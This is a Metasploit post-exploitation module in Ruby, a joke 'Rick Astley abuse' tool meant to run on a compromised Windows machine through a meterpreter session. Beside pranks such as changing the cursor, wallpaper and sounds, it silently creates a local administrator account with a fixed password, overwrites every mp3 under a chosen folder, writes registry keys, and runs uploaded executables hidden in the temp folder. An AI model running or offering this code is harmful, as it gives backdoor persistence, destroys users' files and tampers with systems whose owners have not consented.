require 'msf/core'
require 'msf/core/post/windows/accounts'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Rickloaf Abuse Post module - Rick Astley will never give you up',
			'Description'   => %q{
					We're giving you more than the roll.  We're giving you the whole loaf.
					This module aims to be a comprehensive Rick Astley Abuse script, because the pimp hand must stay strong.
					Of course this is last minute shit for the hacker meeting.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'DJ Manila Ice', 'iParker', 'crymsen', 'porkchop', 'BMack'], 
			'Version'       => '1',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
		register_options(
                        [
                                OptString.new(   'COMMAND',  [false, 'COMMAND String to execute specific Rick functionality']),
                                OptString.new(   'PATH',  [false, 'PATH String to specify directory for an action']),
                        ], self.class)
	end

	def run
		if datastore["COMMAND"].eql? "cursor"
			make_rick_astley_cursor
		elsif datastore["COMMAND"].eql? "video"
			launch_video
		elsif datastore["COMMAND"].eql? "printer"
			print_rick_to_default_printer
		elsif datastore["COMMAND"].eql? "screensaver"
			install_screensaver	
		elsif datastore["COMMAND"].eql? "background"
			change_background
		elsif datastore["COMMAND"].eql? "user"
			add_rick_astley_user
		elsif datastore["COMMAND"].eql? "keystroke"
			install_keystrokes
		elsif datastore["COMMAND"].eql? "systemsounds"
			rickify_system_sounds	
		elsif datastore["COMMAND"].eql? "rickastleyhotline"
			call_the_rick_astley_hotline	
		elsif datastore["COMMAND"].eql? "icons"
			change_system_icons
		elsif datastore["COMMAND"].eql? "loadingscreen"
			change_loading_screen
		elsif datastore["COMMAND"].eql? "reaction"
			record_reactions
		elsif datastore["COMMAND"].eql? "music" and not datastore["PATH"].nil? 
			change_music
		else
			# Turn off the keyboard
			# run all the methods
			#make_rick_astley_cursor
			#print_rick_to_default_printer
			#change_background
			#add_rick_astley_user
			#install_keystrokes
			#change_music		
			#launch_video
			# Turn back on the keyboard
			print_status "This is the default to blast everything, specify commands until implemented."
		end
	end
	
	def make_rick_astley_cursor
		# path to the rick cursor
		path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_cursor_filename = "rick.cur"
		rick_cur = ::File.join(path, rick_cursor_filename)
				
		session.fs.file.upload_file("%SystemRoot%\\Cursors\\#{rick_cursor_filename}", rick_cur)

		# write a quick script to change this cursor with keystrokes - it's ghetto but meh.		
		tempdir = client.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		fd = client.fs.file.new(tempvbs, "wb")
		mouse_cursor_rickroll_script = "Set oShell = CreateObject(\"WScript.Shell\") \n" +
		"Set oSHApp = CreateObject(\"Shell.Application\") \n" +
		"Set oFSO = CreateObject(\"Scripting.FileSystemObject\") \n " +
		"oSHApp.ControlPanelItem cstr(\"main.cpl\") \n"  +
		"Do Until oShell.AppActivate (\"Mouse Properties\") \n" +
		"Loop \n" +
		"oShell.SendKeys \"+{TAB}\" \n" +
		"oShell.SendKeys \"{RIGHT}\" \n" +
		"oShell.SendKeys \"%B\" \n" +
		"oShell.SendKeys \"rick.cur\" \n" +
		"oShell.SendKeys \"{ENTER}\" \n" +
		"WScript.Sleep(2 * 1000) \n" +
		"oShell.SendKeys \"{ENTER}\" \n"
		  
		fd.write(mouse_cursor_rickroll_script)
		fd.close
		cmd = "start #{tempvbs}"

		session.sys.process.execute("cmd.exe /c cscript \"#{tempvbs}\"", nil, {'Hidden' => true})

		print_status("Mouse cursor changed.")

	end


	def add_rick_astley_user
		begin
			session.sys.process.execute("net user RickAstley nevagonnagive /add", nil, {'Hidden' => true})
			session.sys.process.execute("net localgroup administrators RickAstley /add", nil, {'Hidden' => true})
			print_status "Rick Astley has been added as an administrative user!"
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end

	def launch_video
		path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_video_filename = "rick.wmv"
		rick_avi = ::File.join(path, rick_video_filename)

		print_status("Uploading video")
		mediaplayer = "\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\""
		
		tempdir = client.fs.file.expand_path("%TEMP%")
		temp_video = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".wmv"
		print_status "Uploading to => " + temp_video
		session.fs.file.upload_file("#{temp_video}", rick_avi)

		session.sys.process.execute("#{mediaplayer} \"#{temp_video}\"", nil, {'Hidden' => false})
		print_status "Video launch completed!"
	end
	
	def install_screensaver
		# TODO infect this with meterpreter to add insult to injury
		print_status "Starting a Screensaver of Rick Astley"
		path = ::File.join(Msf::Config.install_root, "data", "post")
                rick_scr_filename = "rick.scr"
                rick_scr = ::File.join(path, rick_scr_filename)

                tempdir = client.fs.file.expand_path("%TEMP%")
                temp_scr = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) +".scr"
                print_status "uploading to => " + temp_scr
                session.fs.file.upload_file("#{temp_scr}", rick_scr)
			
		session.sys.process.execute("cmd.exe /c \"#{temp_scr}\" /s", nil, {'Hidden' => false})
		print_status "Screensaver execution completed!"
	end
	
	def print_rick_to_default_printer
		path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_picture_filename = "rick.png"
		rick_png = ::File.join(path, rick_picture_filename)

		tempdir = client.fs.file.expand_path("%TEMP%")
		temp_picture = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".png"
		print_status "uploading to => " + temp_picture
		session.fs.file.upload_file("#{temp_picture}", rick_png)

		print_status("Printing Rick out to the default printer")
		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
		print_status("Print execution completed!")
	end


	def change_background
		# straight up mubix's code, no front.  Can't fuck with his code.  Props dude.
		# http://www.room362.com/scripts-and-programs/metasploit/wallpaper.rb
		# Change Wallpaper

		session = client
		key = "HKCU"
		wallpaper = "rickosuave.bmp"
		dir  = ::File.join(Msf::Config.install_root, "data", "post")
		based = ::File.join(dir, wallpaper)

		bgcolor = "0 0 0" # set to 255 255 255 for white
		refresh_cmd = "rundll32.exe user32.dll, UpdatePerUserSystemParameters"
		delay = 5

		#Upload Image
		tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
		print_status("Creating a temp dir for wallpaper #{tempdir}...")
		client.fs.dir.mkdir(tempdir)

		print_status(" >> Uploading #{wallpaper}...")

		fd = client.fs.file.new(tempdir + "\\" + wallpaper, "wb")
		fd.write(::File.read(based, ::File.size(based)))
		fd.close

		if(key)
			registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","Wallpaper","#{tempdir}\\#{wallpaper}","REG_SZ")

			registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","TileWallpaper","0","REG_SZ")
			print_status("Set Wallpaper to #{tempdir}"+"\\"+"#{wallpaper}")
		else
			print_status("Error: failed to open the registry key for writing")
		end

		#Refresh the users' desktop config
		session.sys.process.execute(refresh_cmd, nil, {'Hidden' => true, 'Channelized' => true})
		print_status "Background change completed"
	end
	
	def change_music
		print_status "Changing mp3's in " + datastore['PATH']
		music_path = datastore['PATH']	
		path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_mp3_filename = "rick.mp3"
		rick_mp3 = ::File.join(path, rick_mp3_filename)
		scan(music_path, rick_mp3)	
		print_status "Music change completed!  Once they find out the mp3s have changed, that gangster will become a sensitive thug."
	end

	def scan(path, rick_mp3)
		begin
			dirs = client.fs.dir.foreach(path)
		rescue ::Rex::Post::Meterpreter::RequestError => e
			print_error("Error scanning #{path}: #{$!}")
			return
		end

		dirs.each {|x|
			next if x =~ /^(\.|\.\.)$/
			fullpath = path + '\\' + x

			if client.fs.file.stat(fullpath).directory?
				scan(fullpath, rick_mp3)
			elsif fullpath =~ /\.mp3/i
				# Replace ':' or '%' or '\' by '_'
				print_line("uploading rick mp3 to -> '#{fullpath}'")
				client.fs.file.upload_file(fullpath, rick_mp3)
			end
		}
	end

	def install_keystrokes 
		path = ::File.join(Msf::Config.install_root, "data", "post")
                rick_keystroke_filename = "RickKeyStroke.exe"
                rick_keystroke = ::File.join(path, rick_keystroke_filename)
		
		tempdir = client.fs.file.expand_path("%TEMP%")
                temp_keystroke = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
                print_status "Uploading to => " + temp_keystroke
                session.fs.file.upload_file("#{temp_keystroke}", rick_keystroke)

                session.sys.process.execute("cmd.exe /c \"#{temp_keystroke}\"", nil, {'Hidden' => true})
                print_status "Keystroke Lyrics launch completed! Commence laughter!"
	end
	
	def rickify_system_sounds
		print_status "Modifying some of the default system sounds"
		sysinfo = session.sys.config.sysinfo
                winver = sysinfo["OS"]		
		print_status "winver is: " + winver
		rick_system_sounds_path = ::File.join(Msf::Config.install_root, "data", "post")
		rick_system_sounds_path = ::File.join(rick_system_sounds_path, "rickloaf_system_sounds")
		win_media_path = "C:\\WINDOWS\\media"
		if winver=~/Windows 7/
			# TODO CHANGE TO THE REGISTRY KEYS
			rick_system_file_dict = {"Windows Critical Stop.wav" => "CriticalStop.wav",
			 "Windows Ding.wav" => "Dings.wav",
			 "Windows Error.wav" => "Error.wav",
			 "Windows Exclamation.wav" => "Exclamation.wav",
			 "Windows Logoff Sound.wav" => "Logoff.wav",
			 "Windows Logon Sound.wav" => "Logon.wav",
			 "Windows Notify.wav" => "Notifys.wav",
			 "Windows Pop-up Blocked.wav" => "PopupBlock.wav",
			 "Windows Shutdown.wav" => "Shutdown.wav",
			 "Windows Startup.wav" => "Startup.wav"
			}
			rick_system_file_dict.each do |remote_rick_filename, local_rick_filename|
				rick_audio = ::File.join(rick_system_sounds_path, local_rick_filename)
				media_file = win_media_path + "\\" + local_rick_filename 
				print_status "uploading #{media_file}"
				client.fs.file.upload_file(media_file, rick_audio)
				# TODO Change the registry key of .current for each event in HKCU/ AppEvents/ Schemes/ Apps/ .Default/ <eventname> / .current
			end
		elsif winver=~/Windows XP/
			rick_system_file_dict = {"Windows XP Critical Stop.wav" => "CriticalStop.wav",
			 "Windows XP Ding.wav" => "Dings.wav",
			 "Windows XP Error.wav" => "Error.wav",
			 "Windows XP Exclamation.wav" => "Exclamation.wav",
			 "Windows XP Logoff Sound.wav" => "Logoff.wav",
			 "Windows XP Logon Sound.wav" => "Logon.wav",
			 "Windows XP Notify.wav" => "Notifys.wav",
			 "Windows XP Pop-up Blocked.wav" => "PopupBlock.wav",
			 "Windows XP Shutdown.wav" => "Shutdown.wav",
			 "Windows XP Startup.wav" => "Startup.wav"
			}
			rick_system_file_dict.each do |remote_rick_filename, local_rick_filename|
				rick_audio = ::File.join(rick_system_sounds_path, local_rick_filename)
				media_file = win_media_path + "\\" +remote_rick_filename 
				print_status "uploading #{media_file}"
				client.fs.file.upload_file(media_file, rick_audio)
			end
		end
		print_status "Default system sounds modification completed! "
	end

	def call_the_rick_astley_hotline
		print_status "Calling the Rick Astley Hotline!"
		skype = "\"C:\\Program Files\\Skype\\Phone\\Skype.exe\""
                session.sys.process.execute("#{skype} /callto:+17722574501", nil, {'Hidden' => false}) # muhahaha
		print_status "Callto command complete! I WANT YOU TO HEAR MY RAP ALBUM, BAMMMMMMMM!"
	end

	def call_rick_hotline_via_gv
		#TODO deploy sip client to auto accept call made to it so that a call to the hotline can be facilitated
	end
	
	def change_system_icons
		#TODO UPLOAD VARIOUS .ico files, refer to this to get key to change => http://www.virtualplastic.net/html/icn_reg.html
		path = ::File.join(Msf::Config.install_root, "data", "post")
                rick_picture_filename = "rick.ico"
                rick_ico = ::File.join(path, rick_picture_filename)

                tempdir = client.fs.file.expand_path("%TEMP%")
                temp_picture = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".ico"
                print_status "uploading to => " + temp_picture
                session.fs.file.upload_file("#{temp_picture}", rick_ico)
		
		
		reg_keys = ["HKCR\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon", # My Computer
				"HKCR\\CLSID\\{450D8FBA-AD25-11D0-98A8-0800361B1103}\\DefaultIcon", # My Documents 
				"HKCR\\CLSID\\{2227A280-3AEA-1069-A2DE-08002B30309D}\\DefaultIcon", # Printers 
				"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon", # Recycle Bin 
				"HKCR\\CLSID\\{208D2C60-3AEA-1069-A2D7-08002B30309D}\\DefaultIcon", # Network Neighborhood 
				"HKCR\\CLSID\\{0DF44EAA-FF21-4412-828E-260A8728E7F1}\\DefaultIcon", # Taskbar and Start Menu 
				] 
		reg_keys.each do |reg_key|	
			registry_setvaldata(reg_key,"" ,"#{temp_picture}","REG_SZ")
		end	
=begin		
		shell_icons_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell\ Icons"
		registry_createkey("#{shell_icons_key}")
		(1..40).each do |i|
			registry_setvaldata("#{shell_icons_key}", "\"#{i}\"","\"#{temp_picture},0\"","REG_SZ")
		end
=end
	end
	
	def change_loading_screen
		#TODO implement Ian's windows loading screen
	end
	
	def record_reactions
		#TODO figure out how espia works or how to call it
	end

end
